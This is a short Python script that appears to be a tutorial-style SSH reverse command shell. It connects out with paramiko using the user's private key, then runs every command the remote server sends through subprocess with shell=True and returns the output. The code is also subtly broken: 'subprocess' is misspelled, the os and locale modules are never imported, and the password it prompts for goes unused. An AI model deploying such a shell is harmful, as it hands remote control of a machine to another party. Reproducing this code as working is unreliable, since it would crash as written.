import paramiko

key_path = "~/.ssh/id_rsa"

def ssh_command(ip, port, user, passwd, cmd):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    prv_key = paramiko.RSAKey.from_private_key_file(key_path)
    
    client.connect(ip, port=port, username=user, pkey=prv_key)    

    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(cmd)
        print( ssh_session.recv(1024).decode() )
        while True:
            cmd = ssh_session.recv(1024)
            try:
                cmd1 = cmd.decode()
                if cmd1 == 'exit':
                    client.close()
                    break
                cmd_output = suprocess.check_output(cmd1, shell=True)
                if os.name == 'nt' and locale.getdefaultlocale() == ('ja_JP', 'cp932'):
                    cmd_output = cmd_output.decode('cp932')
                ssh_session.send(cmd_output or 'okay')
            except Exception as e:
                ssh_session.send(str(e))
        client.close()
    return

if __name__ == "__main__":
    print("-----start-----")
    import getpass
    user = input('Username: ')
    password = getpass.getpass()

    ip = "127.0.0.1"
    port = 22
    ssh_command(ip, port, user, password, 'ClientConnected')
    print("---End---")
